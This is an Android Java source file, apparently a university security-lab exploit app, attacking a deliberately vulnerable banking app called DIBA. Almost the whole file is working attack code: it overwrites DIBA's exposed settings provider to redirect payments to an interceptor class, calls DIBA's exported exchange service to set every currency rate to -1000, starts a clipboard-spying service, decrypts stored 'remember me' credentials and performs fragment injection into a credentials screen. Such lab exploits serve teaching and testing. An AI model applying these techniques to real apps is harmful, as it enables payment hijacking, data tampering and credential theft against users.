package ch.zhaw.securitylab.dibaexploit;

import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
//import android.support.annotation.NonNull;
//import android.support.design.widget.NavigationView;
//import android.support.v4.app.ActivityCompat;
//import android.support.v4.content.ContextCompat;
//import android.support.v4.view.GravityCompat;
//import android.support.v4.widget.DrawerLayout;
//import android.support.v7.app.ActionBarDrawerToggle;
//import android.support.v7.app.AppCompatActivity;
//import android.support.v7.widget.Toolbar;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.ActionBarDrawerToggle;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.view.GravityCompat;
import androidx.drawerlayout.widget.DrawerLayout;

import com.google.android.material.navigation.NavigationView;

import ch.zhaw.securitylab.DIBA.AidlServiceCurrencyExchange;

public class MainExploitActivity extends AppCompatActivity implements NavigationView.OnNavigationItemSelectedListener
{
	// -------------------------------------------- //
	// CONSTANTS
	// -------------------------------------------- //
	
	private static final String packageName = "ch.zhaw.securitylab.DIBA";
	private static final String MESSAGES_PERMISSION = "ch.zhaw.securitylab.DIBA.activity.auth.ActivityAuthMessages";
	private static final int MESSAGES_PERMISSION_ID = 1;

	// -------------------------------------------- //
	// FIELDS
	// -------------------------------------------- //
	
	// Views
	private TextView toDecrypt;
	private TextView decrypted;
	
	// Service
	private boolean bound;
	private AidlServiceCurrencyExchange service;
	
	// -------------------------------------------- //
	// OVERRIDE
	// -------------------------------------------- //
	
	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main_exploit);
		Toolbar toolbar = findViewById(R.id.toolbar);
		setSupportActionBar(toolbar);
		
		// Drawer
		DrawerLayout drawer = findViewById(R.id.drawer_layout);
		ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
			this, drawer, toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
		drawer.setDrawerListener(toggle);
		toggle.syncState();
		
		NavigationView navigationView = findViewById(R.id.nav_view);
		navigationView.setNavigationItemSelectedListener(this);
		
		// Buttons
		button(R.id.auto_redirect, onAutoRedirect());
		button(R.id.change_exchange_rates, onChangeExchangeRate());
		
		// Fields
		toDecrypt = findViewById(R.id.to_decrypt);
		decrypted = findViewById(R.id.decrypted);
		toDecrypt.addTextChangedListener(createTextWatcher());
		
		// Service
		Intent intent = new Intent(this, ServiceClipboardSpy.class);
		startService(intent);
	}
	
	@Override
	protected void onDestroy()
	{
		super.onDestroy();
		Intent intent = new Intent(this, ServiceClipboardSpy.class);
		stopService(intent);
	}
	
	private TextWatcher createTextWatcher()
	{
		return new TextWatcher()
		{
			@Override
			public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
			
			@Override
			public void onTextChanged(CharSequence s, int start, int before, int count)
			{
				String text = toDecrypt.getText().toString();
				text = RememberMe.decrypt(text);
				decrypted.setText(text);
			}
			
			@Override
			public void afterTextChanged(Editable s) {}
		};
	}
	
	// -------------------------------------------- //
	// BUTTONS
	// -------------------------------------------- //
	
	private void button(int id, OnClickListener listener)
	{
		Button button = findViewById(id);
		button.setOnClickListener(listener);
	}
	
	private OnClickListener onAutoRedirect() {
		return (View v) -> {
			String defaultPackage = "ch.zhaw.securitylab.dibaexploit";
			String defaultClass = "ch.zhaw.securitylab.dibaexploit.PayInterceptor";
			int defaultAutoUpdate = 0;
			
			String providerName = "ch.zhaw.securitylab.DIBA.settings";
			String url = "content://" + providerName + "/setting";
			Uri contentUri = Uri.parse(url);
			
			// Settings DB
			ContentValues values = new ContentValues();
			values.put("package", defaultPackage);
			values.put("class", defaultClass);
			values.put("autoupdate", defaultAutoUpdate);
			
			int rows = getContentResolver().update(contentUri, values, "_id=1", null);
		};
	}
	
	private OnClickListener onChangeExchangeRate()
	{
		return (View v) ->
		{
			new Thread(() ->
			{
				while (!bound)
				{
					try
					{
						Thread.sleep(200);
					}
					catch (InterruptedException e)
					{
						e.printStackTrace();
					}
				}
				
				try
				{
					for (String currency : service.getCurrencies())
					{
						changeExchangeRate("-1000", currency);
					}
				}
				catch (RemoteException e)
				{
					throw new RuntimeException(e);
				}
			}).start();
		};
	}
	
	@Override
	public void onBackPressed()
	{
		DrawerLayout drawer = findViewById(R.id.drawer_layout);
		if (drawer.isDrawerOpen(GravityCompat.START))
		{
			drawer.closeDrawer(GravityCompat.START);
		}
		else
		{
			super.onBackPressed();
		}
	}
	
	// -------------------------------------------- //
	// NAVIGATION
	// -------------------------------------------- //
	
	@Override
	public boolean onNavigationItemSelected(MenuItem item)
	{
		// Handle navigation view item clicks here.
		int id = item.getItemId();
		Intent intent = null;
		
		if (id == R.id.open_diba_investments)
		{
			intent = new Intent();
			intent.setClassName(packageName, "ch.zhaw.securitylab.DIBA.SeeInvest");
		}
		else if (id == R.id.open_diba_messages) {
			if (ContextCompat.checkSelfPermission(this, "ch.zhaw.securitylab.DIBA.Messages") != PackageManager.PERMISSION_GRANTED)
			{
				ActivityCompat.requestPermissions(this,
						new String[]{MESSAGES_PERMISSION},
						MESSAGES_PERMISSION_ID);
			}
			else
			{
				openMessages();
			}
		}
		else if (id == R.id.clipboard_log)
		{
			intent = new Intent(this, ActivityClipboardLog.class);
		}
		else if (id == R.id.fragment_injection)
		{
			intent = new Intent();
			intent.setClassName(packageName, "ch.zhaw.securitylab.DIBA.activity.unauth.ActivityCredentials");
			intent.putExtra(
				"credentials_fragment",
				"ch.zhaw.securitylab.DIBA.activity.unauth.FragmentChange"
			);
		}
		
		if (intent != null) startActivity(intent);
		
		DrawerLayout drawer = findViewById(R.id.drawer_layout);
		drawer.closeDrawer(GravityCompat.START);
		return true;
	}

	@NonNull
	private void openMessages()
	{
		Intent intent;
		intent = new Intent();
		intent.setClassName(packageName, MESSAGES_PERMISSION);
		startActivity(intent);
	}

	// -------------------------------------------- //
	// CURRENCY EXCHANGE SERVICE
	// -------------------------------------------- //
	
	@Override
	protected void onStart()
	{
		super.onStart();
		// Bind to LocalService
		String className = "ch.zhaw.securitylab.DIBA.service.ServiceCurrencyExchange";
		
		Intent intent = new Intent();
		intent.setComponent(new ComponentName(packageName, className));
		bindService(intent, Connection, BIND_AUTO_CREATE);
	}
	
	@Override
	protected void onStop()
	{
		super.onStop();
		unbindService(Connection);
		bound = false;
	}
	
	private void boundOrThrow()
	{
		if (!bound) throw new RuntimeException("No service bound");
	}
	
	private void changeExchangeRate(String exchangeRate, String currency)
	{
		boundOrThrow();
		try
		{
			service.changeExchangeRate(exchangeRate, currency);
		}
		catch (RemoteException e)
		{
			throw new RuntimeException(e.getMessage());
		}
	}
	
	private ServiceConnection Connection = new ServiceConnection()
	{
		// Called when the connection with the service is established
		public void onServiceConnected(ComponentName className, IBinder localService)
		{
			// Following the example above for an AIDL interface,
			// this gets an instance of the IRemoteInterface, which we can use to call on the service
			service = AidlServiceCurrencyExchange.Stub.asInterface(localService);
			bound = true;
		}
		
		// Called when the connection with the service disconnects unexpectedly
		public void onServiceDisconnected(ComponentName className)
		{
			service = null;
			bound = false;
		}
	};

	@Override
	public void onRequestPermissionsResult(int requestCode,
										   String permissions[], int[] grantResults) {
		switch (requestCode) {
			case MESSAGES_PERMISSION_ID:
			{
				// If request is cancelled, the result arrays are empty.
				if (grantResults.length > 0	&& grantResults[0] == PackageManager.PERMISSION_GRANTED)
				{
					openMessages();
				}
				return;
			}
		}
	}
}
